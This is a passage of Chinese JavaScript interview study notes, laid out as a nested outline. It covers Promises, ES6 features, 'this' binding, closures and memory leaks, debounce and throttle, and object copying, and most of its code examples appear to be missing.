我们基本上还要对每次请求的结果进行一些处理，代码会更加臃肿，在一个团队中，代码 review 以及后续的维护将会是一个很痛苦的过程。\r\n\r\n\t\t- 回调地狱带来的负面作用有以下几点：\r\n\r\n\t\t\t- 代码臃肿。\r\n\t\t\t- 可读性差。\r\n\t\t\t- 耦合度过高，可维护性差。\r\n\t\t\t- 代码复用性差。\r\n\t\t\t- 容易滋生 bug。\r\n\t\t\t- 只能在回调里处理异常。\r\n\r\n\t\t- 出现了问题，自然就会有人去想办法。这时，就有人思考了，能不能用一种更加友好的代码组织方式，解决异步嵌套的问题。\r\n\r\n\t- （3）Promise 解决的痛点还有其他方法可以解决吗？如果有，请列举。\r\n\t- （4）Promise 如何使用？\r\n\r\n\t\t-  Promise 的常规写法：\r\n\r\n\t\t\t- 比较一下这种写法和上面的回调式的写法。我们不难发现，Promise 的写法更为直观，并且能够在外层捕获异步函数的异常信息。\r\n\r\n\t\t- 用法举例\r\n\r\n\t\t\t- 一，需求方法步骤\r\n\r\n\t\t\t\t- 你先去超市买菜。\r\n\t\t\t\t- 用超市买回来的菜做饭。\r\n\t\t\t\t- 将做好的饭菜送到老婆单位。\r\n\t\t\t\t- 送到单位后打电话告诉我。\r\n\r\n\t\t\t- 二，写好函数\r\n\r\n\t\t\t- 三，利用promise实现功能\r\n\r\n\t\t\t- 注意：请一定要谨记：如果我们的后续任务是异步任务的话，必须return 一个 新的 promise 对象。如果后续任务是同步任务，只需 return 一个结果即可。\r\n\r\n我们上面举的例子，除了电话通知我是一个同步任务，其余的都是异步任务，异步任务 return 的是 promise对象。\r\n\r\n\t\t- 使用总结\r\n\r\n\t\t\t- \r\n（1）首先初始化一个 Promise 对象，可以通过两种方式创建， 这两种方式都会返回一个 Promise 对象。\r\n\r\n\t\t\t\t- 1、new Promise(fn)\r\n\t\t\t\t- 2、Promise.resolve(fn)\r\n\r\n\t\t\t- （2）然后调用上一步返回的 promise 对象的 then 方法，注册回调函数。\r\n\r\n\t\t\t\t- then 中的回调函数可以有一个参数，也可以不带参数。如果 then 中的回调函数依赖上一步的返回结果，那么要带上参数。比如\r\n\t\t\t- （3）最后注册 catch 异常处理函数，处理前面回调中可能抛出的异常。\r\n\r\n\t- （5）Promise 常用的方法，方法的作用？\r\n\r\n\t\t- Promise.resolve(value)\r\n\r\n\t\t\t- 有时需要将现有对象转为 Promise 对象，Promise.resolve方法就起到这个作用。\r\n\r\n\t\t\t\t- Promise.resolve等价于下面的写法。\r\n\r\n\t\t\t- 1、如果这个值是个thenable（即带有then方法），返回的promise会“跟随”这个thenable的对象，采用它的最终状态（指 resolved/rejected/pending/settled）\r\n\r\n\t\t\t- 2、如果传入的 value 本身就是 promise 对象，则该对象作为 Promise.resolve 方法的返回值返回。\r\n\r\n\t\t\t- 3、其他情况以该值为成功状态返回一个 promise 对象。\r\n\r\n\t\t- Promise.reject(value)\r\n\r\n\t\t\t- 与 resolve 唯一的不同是，返回的 promise 对象的状态为 rejected。\r\n\r\n\t\t- Promise.then\r\n\r\n\t\t\t- 为 promise 注册回调函数，函数形式：fn(vlaue){}，value 是上一个任务的返回结果，then 中的函数一定要 return 一个结果或者一个新的 Promise 对象，才可以让之后的then 回调接收。\r\n\r\n\t\t- Promise.catch\r\n\r\n\t\t\t- 捕获异常，函数形式：fn(err){}, err 是 catch注册 之前的回调抛出的异常信息。\r\n\r\n\t\t- Promise.race\r\n\r\n\t\t\t- 多个promise 任务同时执行，只返回最先执行完的 Promise 任务的结果。 \r\n\r\n\t\t- Promise.all\r\n\r\n\t\t\t- 多个promise 任务同时执行，返回所有promise 任务的执行结果。\r\n\r\n\t- （6）Promise 在事件循环中的执行过程是怎样的？\r\n\t- （7）Promise 的升级\r\n\r\n\t\t- ES6 出现了 generator 以及 async/await 语法，使异步处理更加接近同步代码写法，可读性更好，同时异常捕获和同步代码的书写趋于一致。\r\n\t- （8）能不能手写一个 Promise 的polyfill。\r\n\r\n### 【ES6】说出你知道的ES6新特性\r\n\r\n- ES6常考问题\r\n\r\n\t- 为什么const定义一个数组与对象，仍然可以对其操作?\r\n\r\n\t\t- const实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址不得改动。\r\n\t\t- 对于简单类型的数据（数值、字符串、布尔值）\r\n\r\n\t\t\t- 值就保存在变量指向的那个内存地址，因此等同于常量。\r\n\r\n\t\t- 对于复合类型的数据（主要是对象和数组）\r\n\r\n\t\t\t- 变量指向的内存地址，保存的只是一个指针，const只能保证这个指针是固定的，至于它指向的数据结构是不是可变的，就完全不能控制了\r\n\t\t\t- 上面代码中，常量foo储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把foo指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。\r\n\r\n\t\t\t- 上面代码中，常量a是一个数组，这个数组本身是可写的，但是如果将另一个数组赋值给a，就会报错。\r\n\r\n\t\t\t- 如果真的想将对象冻结，应该使用Object.freeze方法。\r\n\r\n\t\t\t\t- 上面代码中，常量foo指向一个冻结的对象，所以添加新属性不起作用，严格模式时还会报错。\r\n\t\t\t\t- 除了将对象本身冻结，对象的属性也应该冻结。下面是一个将对象彻底冻结的函数。\r\n\r\n- Promise\r\n\r\n\t- 什么是Promise？\r\n\r\n\t\t- 传统的异步编程最大的特点就是地狱般的回调嵌套，一旦嵌套次数过多，就很容易使我们的代码难以理解和维护。而Promise则可以让我们通过链式调用的方法去解决回调嵌套的问题，使我们的代码更容易理解和维护，而且Promise还增加了许多有用的特性，让我们处理异步编程得心应手。\r\n\t\t- 传统的异步回调函数\r\n\r\n\t\t\t- （1）每个回调函数，都会无法确定另一个回调函数会在何时会被调用，因为这个控制权不在当前这个程序之中。\r\n\t\t\t- （2）每个回调函数，都或多或少的依赖于上一个回调函数执行的时间和数据\r\n\t\t\t- 问题\r\n\r\n\t\t\t\t- 基于这两点，我们就会发现，一旦你需要这样去编写代码，就必须保证你的上一个回调函数在下一个回调函数之前进行。我们还可以发现，它们之间缺乏一种约定，就是一旦上一个发生了，无论是正确还是错误，都会通知对应的回调函数的约定。\r\n\r\n\t- 如何创建Promise？\r\n\r\n\t\t- 代码示例\r\n\r\n\t\t- 代码解释\r\n\r\n\t\t\t- （1）因为Promise是一个构造函数，所以我们使用了new操作符来创建promise。\r\n\t\t\t- （2）构造函数Promise的参数是一个函数（暂时叫它func），这个函数（func）有两个参数resolve和reject，它们分别是两个函数，这两个函数的作用就是将promise的状态从pending（等待）转换为resolved（已解决）或者从pending（等待）转换为rejected（已失败）。\r\n\t\t\t- （3）创建后的promise有一些方法，then和catch。当然我们也可以人为的在Promise函数上添加一些满足我们自己需求的方法，方便每一个promise对象使用。\r\n\r\n\t\t- 理解Promise\r\n\r\n\t\t\t- Promise函数体的内部包裹着一个异步的请求或者操作或者函数；然后我们可以在这个异步的操作完成的时候使用resolve函数将我们获得的结果传递出去，或者使用reject函数将错误的消息传递出去。\r\n\r\n\t- Promise对象的一些方法\r\n\r\n\t\t- then方法\r\n\r\n\t\t\t- 初步了解\r\n\r\n\t\t\t\t- 可以通过使用then方法将上一步返回的结果获取过来（不管是resolved还是rejected）\r\n\r\n\t\t\t- then方法的使用\r\n\r\n\t\t\t\t- 示例1\r\n\r\n\t\t\t\t\t- 也就是说，我们在创建p这个Promise对象的时候，通过函数resolve传递出去的结果可以被p的第一个then方法中的第一个函数捕获然后作为它的参数。通过函数reject传递出去的结果可以被p的第一个then方法中的第二个函数捕获然后作为它的参数。\r\n\r\n\t\t\t\t- （1）then方法可以接受两个函数作为参数，第一个函数是用来处理resolve的结果，第二个是可选的，用来处理reject的结果。\r\n\t\t\t\t- 示例2\r\n\r\n\t\t\t\t\t- 一旦创建一个Promise对象之后，我们就可以使用then方法来进行链式的调用，而且我们可以把每一次的结果都返还给下一个then方法，然后在下一个then方法中对这个值进行处理。每一个then方法中都可以再次新创建一个Promise对象，然后返还给下一个then方法处理。\r\n\r\n\t\t\t\t- （2）还可以在每一个then方法中创建新的Promise，然后将这个Promise对象返回，之后我们就可以在后面的then方法中继续对这个对象进行操作。\r\n\r\n\t\t- catch方法\r\n\r\n\t\t\t- 初步了解\r\n\r\n\t\t\t\t- 这个方法其实是then方法的一种特例，这个特例就是：.then(null, rejection)，相当于我们不使用then方法的第一个函数，只是用第二个函数；catch函数比较简单，就是用来捕获之前的then方法里面的异常\r\n\r\n\t\t- all方法\r\n\r\n\t\t\t- 初步了解\r\n\r\n\t\t\t\t- \r\nPromise.all方法用来包装许多个Promise实例，然后组成了一个新的Promise对象\r\n\t\t\t\t- 新的Promise对象的状态由前面几个被包裹的Promise对象的状态决定，如果前面的Promise都被resolve了，那么新的Promise的状态也是resolve的；只要有一个Promise被reject了，那么组成的新的Promise的状态也是reject的。\r\n\r\n\t\t\t- 方法的使用\r\n\r\n\t\t- race方法\r\n\r\n\t\t\t- 初步了解\r\n\r\n\t\t\t\t- 和上面的Promise.all有点类似，都是包装许多的Promise对象，然后组成了一个新的Promise对象\r\n\t\t\t\t- 但是使用Promise.race的含义是：只要包裹的的Promise对象中有一个的状态发生了改变，那么组成的这个新的Promise对象的状态就是上面那个率先改变的Promise实例的状态。\r\n\r\n\t\t\t- 方法的使用\r\n\r\n\t\t- resolve方法\r\n\r\n\t\t\t- 初步了解\r\n\r\n\t\t\t\t- 主要是将一个值转变为一个Promise对象，然后使它具有Promise的一些方法和特性，为了满足我们一些特殊情况下的要求。\r\n\r\n\t\t\t- 方法的使用\r\n\r\n\t\t- reject方法\r\n\r\n\t\t\t- 初步了解\r\n\r\n\t\t\t\t- 和Promise.resolve方法一样，只不过通过Promise.reject方法产生的Promise对象的状态是rejected的，\r\n\r\n- let与const\r\n\r\n\t- （1）在同一个块级作用域中，不允许重复定义。\r\n\t- （2）const定义的变量不允许二次修改。\r\n\t- （3）let和const定义的变量会形成块级作用域\r\n\t- （4）它们定义的变量不存在变量提升，以及存在暂时性死区\r\n\r\n- 函数的变化——箭头函数，剩余参数，参数默认值\r\n\r\n\t- 箭头函数\r\n\r\n\t\t- 规则\r\n\r\n\t\t\t- （1）变量如果只有一个的时候，可以省略()\r\n\t\t\t- （2）如果是只有一句返回语句时，可以直接省略{return }这一部分\r\n\t\t\t- （3）因为它本身叫做arrow，所以每次都必须带上=>符号\r\n\r\n\t\t- 注意事项\r\n\r\n\t\t\t- （1）箭头函数不能作为构造函数\r\n\r\n\t\t\t- （2）箭头函数没有它自己的this值，箭头函数内的this值继承自外围作用域。（取决于箭头函数定义时的作用域，不受apply，call，bind影响）\r\n\r\n\t\t\t- （3）箭头函数没有arguments。\r\n\r\n\t- rest剩余参数\r\n\r\n\t\t- ES6 引入 rest 参数（形式为...变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest 参数搭配的变量是一个数组，该变量将多余的参数放入数组中。\r\n\t\t- 注意\r\n\r\n\t\t\t- （1）与扩展运算符相反\r\n\r\n\t\t\t\t- 扩展运算符（spread）是三个点（...）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。\r\n\r\n\t\t\t- （2）rest 参数之后不能再有其他参数（即只能是最后一个参数）\r\n\t\t\t- （3）arguments对象不是数组，而是一个类似数组的对象。所以为了使用数组的方法，必须使用Array.prototype.slice.call先将其转为数组。rest 参数就不存在这个问题，它就是一个真正的数组\r\n\r\n\t- 参数默认值\r\n\r\n\t\t- ES6 允许为函数的参数设置默认值，即直接写在参数定义的后面。\r\n\r\n- 数组——解构赋值、二进制数组\r\n\r\n\t- 解构赋值\r\n\r\n\t\t- 注意\r\n\r\n\t\t\t- （1）必须保证有赋值的过程。\r\n\r\n\t\t\t- （2）左边内容部分的结构必须与右边保持一致。\r\n\r\n\t\t- 使用\r\n\r\n\t\t\t- （1）默认值的使用。\r\n\r\n\t\t\t- （2）在变量中使用解构赋值\r\n\r\n\t- 二进制数组\r\n\r\n- 字符串——模版字符串、startsWith、endsWith\r\n\r\n\t- startWith\r\n\r\n\t\t- 用法\r\n\r\n\t\t\t- 返回值为boolean型，然后去匹配字符串开头的部分\r\n\r\n\t\t- 使用\r\n\r\n\t\t\t- 这个API仅仅在一些场景下起到一定的便捷。比方说，我们需要去匹配一个URL的协议头是什么时，我们往往需要用到这种方式。\r\n\r\n\t- endsWith\r\n\r\n\t\t- 用法\r\n\r\n\t\t\t- 返回值是boolean类型，然后去匹配字符串的结尾。\r\n\r\n\t\t- 使用\r\n\r\n\t\t\t- 这种情况的使用场景是，往往我们需要为上传的文件准备图标，那么我们就可以根据后缀来确定图标。\r\n\r\n- Class和extends\r\n\r\n\t- ES6的class是一种更简洁的语法糖，JS面向对象编程依然是基于原型实现的\r\n\r\n\t\t- ES5中声明类的方式\r\n\r\n\t\t- 利用class语法糖\r\n\r\n\t- extends类的继承，我们可以用extends扩展一个类并继承它的行为，在构造函数中，也可以通过super关键字引用父类的构造函数\r\n\r\n### 【This】JavaScript This 关键字的理解？以及call、apply、bind\r\n\r\n- this\r\n\r\n\t- （1）this的定义\r\n\r\n\t\t- this是在执行上下文创建时确定的一个在执行过程中不可更改的变量。\r\n\t\t- 执行上下文\r\n\r\n\t\t\t- 就是JavaScript引擎在执行一段代码之前将代码内部会用到的一些变量、函数、this提前声明然后保存在变量对象中的过程。\r\n\t\t\t- 这个'代码片段'包括：全局代码(script标签内部的代码)、函数内部代码、eval内部代码。而我们所熟知的作用域链也会在保存在这里，以一个类数组的形式存储在对应函数的[[Scopes]]属性中。\r\n\r\n\t\t- this的多变性\r\n\r\n\t\t\t- this只在函数调用阶段确定，也就是执行上下文创建的阶段进行赋值，保存在变量对象中。这个特性也导致了this的多变性:即当函数在不同的调用方式下都可能会导致this的值不同。\r\n\r\n\t- （2）严格模式与非严格模式下\r\n\r\n\t\t- 当函数独立调用的时候，在严格模式下它的this指向undefined，在非严格模式下，当this指向undefined的时候，自动指向全局对象(浏览器中就是window)\r\n\r\n\t- （3）函数的四种调用方式\r\n\r\n\t\t- 在全局环境或是普通函数中直接调用\r\n\r\n\t\t\t- 需要特别注意的情况\r\n\r\n\t\t\t\t- window, 自执行函数调用时,没有宿主对象,默认是window\r\n\t\t\t\t- 解释，自执行函数需要外部函数调用才会执行\r\n\r\n\t\t\t\t- 与此种情况相同（当函数独立调用的时候，在严格模式下它的this指向undefined，在非严格模式下，当this指向undefined的时候，自动指向全局对象(浏览器中就是window)。）\r\n\r\n\t\t- 作为对象的方法\r\n\r\n\t\t\t- 需要注意隐式丢失\r\n\r\n\t\t\t\t- （1）\r\n\r\n\t\t\t\t- （2）\r\n\r\n\t\t\t\t- obj对象的属性存储的是对该匿名函数的一个引用，可以理解为一个指针。当赋值给其他变量的时候，并没有单独开辟内存空间存储新的函数，而是让其存储了一个指针，此时的obj2就是一个指向匿名函数的指针，调用obj2，相当于直接调用fun，\r\n\r\n\t\t- 使用apply和call\r\n\t\t- 作为构造函数\r\n\r\n\t\t\t- 使用new命令时，它后面的函数调用就不是正常的调用，而是依次执行下面的步骤。\r\n\r\n\t\t\t\t- （1）创建一个空对象，作为将要返回的对象实例\r\n\t\t\t\t- （2）将这个空对象的原型，指向构造函数的prototype属性\r\n\t\t\t\t- （3）将这个空对象赋值给函数内部的this关键字\r\n\t\t\t\t- （4）开始执行构造函数内部的代码，并且返回这个对象\r\n\r\n\t\t\t- 当this碰到return时\r\n\r\n\t\t\t\t- 如果返回值是一个对象，那么this指向的就是那个返回的对象，如果返回值不是一个对象那么this还是指向函数的实例。\r\n\t- （4）箭头函数\r\n\r\n\t\t- （1）箭头函数中的this固定，箭头函数是根据外层（函数或者全局）作用域来决定this\r\n\r\n\t\t\t- 函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。this对象的指向是可变的，但是在箭头函数中，它是固定的。\r\n\r\n\t\t- （2）实质上箭头函数没有自己的this，不能作为构造函数\r\n\r\n\t\t\t- this指向的固定化，并不是因为箭头函数内部有绑定this的机制，实际原因是箭头函数根本没有自己的this，导致内部的this就是外层代码块的this。正是因为它没有this，所以也就不能用作构造函数。\r\n\r\n\t\t- （3）由于箭头函数没有自己的this，所以当然也就不能用call()、apply()、bind()这些方法去改变this的指向。\r\n\t\t- 理解\r\n\r\n\t\t\t- 1.箭头函数作为对象的方法\r\n\r\n\t\t\t\t- 作用域根据外层，即对象所在作用域\r\n\r\n\t\t\t- 2.箭头函数作为函数的返回值或者构造函数的方法\r\n\r\n\t\t\t\t- 作用域根据外层，即其父函数本身的函数作用域\r\n\r\n\t\t\t- 3.箭头函数作为回调函数\r\n\r\n\t\t\t\t- 一层箭头函数\r\n\r\n\t\t\t\t- 多层嵌套的箭头函数\r\n\r\n\t\t\t\t- 复杂情况: 普通函数和箭头函数混杂嵌套\r\n\r\n\t\t\t\t- 严格模式下的情况\r\n\r\n- bind与call，apply的区别\r\n\r\n\t- \r\nbind 返回的是一个函数,并没有执行原函数,只是这个函数的this指向了你给的参数\r\n\t- apply ，call是执行函数,这个函数的this指向了你给的第一个参数\r\n\r\n### 【闭包】什么是闭包及其应用场景\r\n\r\n- 关于闭包的黄金理解\r\n\r\n\t- （1）JavaScript中的闭包，无非就是变量解析的过程。\r\n\r\n\t  每次定义一个函数，都会产生一个作用域链（scope chain）。当JavaScript寻找变量varible时（这个过程称为变量解析），总会优先在当前作用域链的第一个对象中查找属性varible ，如果找到，则直接使用这个属性；否则，继续查找下一个对象的是否存在这个属性；这个过程会持续直至找到这个属性或者最终未找到引发错误为止。\r\n\r\n\t  \r\n\r\n\t- （2）JavaScript中的函数运行在它们被定义的作用域里，而不是它们被执行的作用域里。\r\n\r\n- 闭包的形成与变量的作用域以及变量的生存周期密切相关\r\n\r\n\t- 变量的作用域\r\n\r\n\t\t- （1）全局作用域\r\n\t\t- （2）函数作用域\r\n\r\n\t- 变量的生存周期\r\n\r\n\t\t- （1）对于全局作用域来说，生命周期是永久的，除非你主动销毁\r\n\t\t- （2）对于函数内的局部变量来说，随着函数调用的结束而被销毁\r\n\t\t- 当创建闭包时，函数执行完毕，局部变量并没有消失，这是因为在闭包里返回了一个函数的引用，它可以访问调用到原闭包（外层）函数所产生的环境，而局部变量一直处于这个环境之中，既然局部变量所在的函数还能被外界所访问到，这个局部变量就有了不被销毁的理由，在这里产生了一个闭包结构，局部变量的生命看起来被延续了\r\n\r\n- 闭包的应用\r\n\r\n\t- （1）管理私有变量和私有方法，将对变量（状态）的变化封装在安全的环境中\r\n\t- （2）将代码封装成一个闭包形式，等待时机成熟的时候再使用，比如实现柯里化和反柯里化\r\n\r\n\t\t- 函数柯里化\r\n\r\n\t\t\t- 柯里化是一种将使用多个参数的一个函数转换成一系列使用一个参数的函数的技术。\r\n\r\n- 闭包引发的问题\r\n\r\n\t- \r\n闭包和内存泄露有关系的地方是，使用闭包的同时比较容易造成循环引用，如果闭包的作用域链中保存着一些DOM节点，这时候就有可能造成内存泄漏\r\n\r\n\t\t- 解决：把循环引用中的变量设为null即可，即为切断变量和它此前引用的值之间的连接，当垃圾收集器下次运行时，就会删除这些值并回收它们占用的内存\r\n\t\t- 举个例子\r\n\r\n\t\t- 解决\r\n\r\n\t- 关于JS内存泄露\r\n\r\n\t\t- （1）什么是内存泄漏？\r\n\r\n\t\t\t- 程序的运行需要内存。只要程序提出要求，操作系统或者运行时（runtime）就必须供给内存。\r\n\t\t\t- 对于持续运行的服务进程（daemon），必须及时释放不再用到的内存。否则，内存占用越来越高，轻则影响系统性能，重则导致进程崩溃。\r\n\t\t\t- 不再用到的内存，没有及时释放，就叫做内存泄漏（memory leak）。\r\n\r\n\t\t- （2）垃圾回收机制\r\n\r\n\t\t\t- 存在理由\r\n\r\n\t\t\t\t- 有些语言（比如 C 语言）必须手动释放内存，程序员负责内存管理。\r\n\t\t\t\t- 这很麻烦，所以大多数语言提供自动内存管理，减轻程序员的负担，这被称为\"垃圾回收机制\"（garbage collector）。\r\n\r\n\t\t\t- JS中的垃圾回收机制\r\n\r\n\t\t\t\t- （1）标记清除（现代浏览器使用）\r\n\r\n\t\t\t\t\t- 通常javascript通过标记变量的状态来判断是否被回收,当变量在函数中被声明时标记进入环境,在函数执行结束时,环境被销毁标记离开环境等待回收.只要不释放进入环境的变量,他在环境中的任何位置任何时刻都可以被访问,就不会被垃圾回收机所回收.\r\n\r\n\t\t\t\t\t- 标记清除算法将“不再使用的对象”定义为“无法达到的对象”\r\n\r\n\t\t\t\t\t\t- 简单来说，就是从根部（在JS中就是全局对象）出发定时扫描内存中的对象。凡是能从根部到达的对象，都是还需要使用的。那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收。\r\n\r\n\t\t\t\t\t- 问题\r\n\r\n\t\t\t\t\t\t- 对现代浏览器来说，唯一要注意的就是明确切断需要回收的对象与根部的联系。有时候这种联系并不明显，且因为标记清除算法的强壮性，这个问题较少出现。最常见的内存泄露一般都与DOM元素绑定有关：\r\n\r\n\t\t\t\t\t\t\t- div元素已经从DOM树中清除，也就是说从DOM树的根部无法触及该div元素了。但是请注意，div元素同时也绑定了email对象。所以只要email对象还存在，该div元素将一直保存在内存中。\r\n\r\n\t\t\t\t- （2）引用计数（IE）\r\n\r\n\t\t\t\t\t- javascript去维护一张表,存储内存中资源的引用次数,资源被引用+1,结束引用或者函数执行完毕结束作用域,引用次数-1,引用次数由1到0时不会执行,节省开销,直接标记\r\n\r\n\t\t\t\t\t- 问题\r\n\r\n\t\t\t\t\t\t- 这个方式存在一个比较大的问题就是循环引用，就是说A对象包含一个指向B的指针，对象B也包含一个指向A的引用。 这就可能造成大量内存得不到回收（内存泄露），因为它们的引用次数永远不可能是 0 。\r\n\t\t\t\t\t\t- 例子\r\n\r\n\t\t\t\t\t\t\t- 执行这段代码的时候，将匿名函数对象赋值给el的onclick属性；然后匿名函数内部又引用了el对象，存在循环引用，所以不能被回收；\r\n\r\n\t\t\t\t\t\t- 解决方法：\r\n\r\n\t\t- （3）内存泄漏的识别方法\r\n\r\n\t\t\t- 1、经验方法\r\n\r\n\t\t\t\t- 如果连续五次垃圾回收之后，内存占用一次比一次大，就有内存泄漏。 这要我们实时查看内存占用。\r\n\r\n\t\t\t- 2、浏览器方法\r\n\r\n\t\t\t\t- 1）打开开发者工具，选择 Timeline 面板\r\n\t\t\t\t- 2）在顶部的Capture字段里面勾选 Memory\r\n\t\t\t\t- 3）点击左上角的录制按钮。\r\n\t\t\t\t- 4）在页面上进行各种操作，模拟用户的使用情况。\r\n\t\t\t\t- 4）一段时间后，点击对话框的 stop 按钮，面板上就会显示这段时间的内存占用情况。\r\n\t\t\t\t- 如果内存占用基本平稳，接近水平，就说明不存在内存泄漏。 反之，就是内存泄漏了。\r\n\r\n\t\t\t- 3、命令行方法\r\n\r\n\t\t\t\t- 命令行可以使用 Node 提供的 process.memoryUsage 方法。（判断内存泄漏，以heapUsed字段为准。）\r\n\t\t\t\t\t- rss（resident set size）：所有内存占用，包括指令区和堆栈。\r\n\t\t\t\t\t- heapTotal：\"堆\"占用的内存，包括用到的和没用到的。\r\n\t\t\t\t\t- heapUsed：用到的堆的部分。\r\n\t\t\t\t\t- external： V8 引擎内部的 C++ 对象占用的内存。\r\n\r\n\t\t- （4）WeakMap\r\n\r\n\t\t\t- 问题的提出\r\n\r\n\t\t\t\t- 及时清除引用非常重要。但是，你不可能记得那么多，有时候一疏忽就忘了，所以才有那么多内存泄漏。\r\n\t\t\t\t- 最好能有一种方法，在新建引用的时候就声明，哪些引用必须手动清除，哪些引用可以忽略不计，当其他引用消失以后，垃圾回收机制就可以释放内存。这样就能大大减轻程序员的负担，你只要清除主要引用就可以了。\r\n\r\n\t\t\t- ES6的弱引用\r\n\r\n\t\t\t\t- ES6 考虑到了这一点，推出了两种新的数据结构：WeakSet 和 WeakMap。它们对于值的引用都是不计入垃圾回收机制的，所以名字里面才会有一个\"Weak\"，表示这是弱引用。\r\n\r\n\t\t\t- 使用\r\n\r\n\t\t\t\t- 解释\r\n\r\n\t\t\t\t\t- 先新建一个 Weakmap 实例。然后，将一个 DOM 节点作为键名存入该实例，并将一些附加信息作为键值，一起存放在 WeakMap 里面。这时，WeakMap 里面对element的引用就是弱引用，不会被计入垃圾回收机制。\r\n\t\t\t\t\t- 也就是说，DOM 节点对象的引用计数是1，而不是2。这时，一旦消除对该节点的引用，它占用的内存就会被垃圾回收机制释放。Weakmap 保存的这个键值对，也会自动消失。\r\n\r\n\t\t\t\t- 基本上，如果你要往对象上添加数据，又不想干扰垃圾回收机制，就可以使用 WeakMap。\r\n\r\n### 【防抖与节流】JS中的函数防抖与节流\r\n\r\n- 函数防抖\r\n\r\n\t- 解释\r\n\r\n\t\t- 在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。\r\n\r\n\t- 实现\r\n\r\n- 函数节流\r\n\r\n\t- 解释\r\n\r\n\t\t- 规定一个单位时间，在这个单位时间内，只能有一次触发事件的回调函数执行，如果在同一个单位时间内某事件被触发多次，只有一次能生效。\r\n\r\n\t- 实现\r\n\r\n- 区别以及应用场景\r\n\r\n\t- 区别\r\n\r\n\t\t- 假设，我们观察的总时间为10秒钟，规定1秒作为一次事件的最小间隔时间。\r\n\r\n\t\t\t- 如果触发事件的频率是 0.5s/次，那么\r\n\r\n\t\t\t\t- 函数防抖\r\n\r\n\t\t\t\t\t- 因为始终没法等一秒钟就被再次触发了，所以最终没有一次事件是成功的。\r\n\r\n\t\t\t\t- 函数节流\r\n\r\n\t\t\t\t\t- 因为控制了最多一秒一次，频率为0.5s/次，所以每一秒钟就有一次事件作废。最终控制成1s/次\r\n\r\n\t\t\t- 如果触发事件的频率是 2s/次，那么\r\n\r\n\t\t\t\t- 函数防抖\r\n\r\n\t\t\t\t\t- 因为2s/次已经大于了规定的最小时间，所以每计时两秒便触发一次。\r\n\r\n\t\t\t\t- 函数节流\r\n\r\n\t\t\t\t\t- 同样，2s/次 大于了最小时间规定，所以每一次触发都生效。\r\n\r\n\t- 应用场景\r\n\r\n\t\t- 函数防抖（哪些时候对于连续的事件响应我们只需要执行一次回调？）\r\n\r\n\t\t\t- 适合多次事件一次响应的情况\r\n\r\n\t\t\t\t- \r\n（1）文本输入的验证（连续输入文字后发送 AJAX 请求进行验证，验证一次就好）\r\n\t\t\t\t- （2）判断scroll是否滑到底部，滚动事件+函数防抖\r\n\t\t\t\t- （3）调节浏览器size，监听resize()函数\r\n\r\n\t\t\t\t\t- 对于浏览器窗口，每做一次 resize 操作，发送一个请求，很显然，我们需要监听 resize 事件，但是和 mousemove 一样，每缩小（或者放大）一次浏览器，实际上会触发 N 多次的 resize 事件，用节流？节流只能保证定时触发，我们一次就好，这就要用去抖。\r\n\r\n\t\t\t- 简单的说，函数去抖就是对于一定时间段的连续的函数调用，只让其执行一次。\r\n\r\n\t\t- 函数节流（哪些时候我们需要间隔一定时间触发回调来控制函数调用频率？）\r\n\r\n\t\t\t- 适合大量事件按时间做平均分配触发\r\n\r\n\t\t\t\t- （1）DOM 元素的拖拽功能实现（mousemove）\r\n\r\n\t\t\t\t\t- 实现一个原生的拖拽功能（不能用 H5 Drag&Drop API），需要一路监听 mousemove 事件，在回调中获取元素当前位置，然后重置 dom 的位置（样式改变）。如果我们不加以控制，每移动一定像素而触发的回调数量是会非常惊人的，回调中又伴随着 DOM 操作，继而引发浏览器的重排与重绘，性能差的浏览器可能就会直接假死，这样的用户体验是非常糟糕的。我们需要做的是降低触发回调的频率，比如让它 500ms 触发一次，或者 200ms，甚至 100ms，这个阈值不能太大，太大了拖拽就会失真，也不能太小，太小了低版本浏览器可能就会假死，这样的解决方案就是函数节流，英文名字叫「throttle」。\r\n\r\n\t\t\t\t- （2）射击游戏的 mousedown/keydown 事件（单位时间只能发射一颗子弹）\r\n\t\t\t\t- （3）计算鼠标移动的距离（mousemove）\r\n\t\t\t\t- （4）Canvas 模拟画板功能（mousemove）\r\n\t\t\t\t- （5）搜索联想（keyup）\r\n\t\t\t\t- （6）监听滚动事件判断是否到页面底部自动加载更多：给 scroll 加了 debounce 后，只有用户停止滚动后，才会判断是否到了页面底部；如果是 throttle 的话，只要页面滚动就会间隔一段时间判断一次\r\n\r\n\t\t\t- 函数节流的核心是，让一个函数不要执行得太频繁，减少一些过快的调用来节流。\r\n\r\n### 【深浅拷贝】JavaScript 对象的浅拷贝和深拷贝区别？\r\n\r\n- 怎么判断两个对象相等？\r\n\r\n\t- 浅度比较\r\n\r\n\t\t- 使用JSON.stringify序列化一个对象时\r\n\r\n\t\t\t- （1）序列化后的属性出现的顺序是不定的，除了数组中的元素-其按数组中位置顺序序列化\r\n\t\t\t- （2）Boolean/Number/String对象转成其原始值\r\n\t\t\t- （3）如果属性值为undefined、函数对象，symbol(ES6中新类型)，那么这个属性要么在序列化的时候被忽略，要么被转成null（当在数组中出现时）\r\n\t\t\t- （4）以symbol类型为属性key的属性被完全忽略\r\n\t\t\t- （5）不可枚举的属性也被忽略\r\n\r\n\t- 深度比较\r\n\r\n\t\t- underscore中的eq函数源码\r\n\r\n- 浅拷贝\r\n\r\n\t- 定义\r\n\r\n\t\t- 只会将对象的各个属性进行依次复制，并不会进行递归复制，而js存储对象都是存地址的，所以浅复制会导致old.c和new.c 指向同一块内存地址；会导致引用。\r\n\r\n\t- 实现\r\n\r\n\t\t- （1）简单的赋值语句\r\n\r\n\t\t- （2）Object.assign(目标对象，源对象)\r\n\r\n\t\t\t- Object.assign() 方法可以把任意多个的源对象自身的可枚举属性拷贝给目标对象，然后返回目标对象。但是 Object.assign() 进行的是浅拷贝，拷贝的是对象的属性的引用，而不是对象本身。\r\n\r\n- 深拷贝\r\n\r\n\t- 定义\r\n\r\n\t\t- 它不仅将原对象的各个属性逐个复制出去，而且将原对象各个属性所包含的对象也依次采用深复制的方法递归复制到新对象上。这就不会存在上面old和new的c属性指向同一个对象的问题。\r\n\r\n\t- 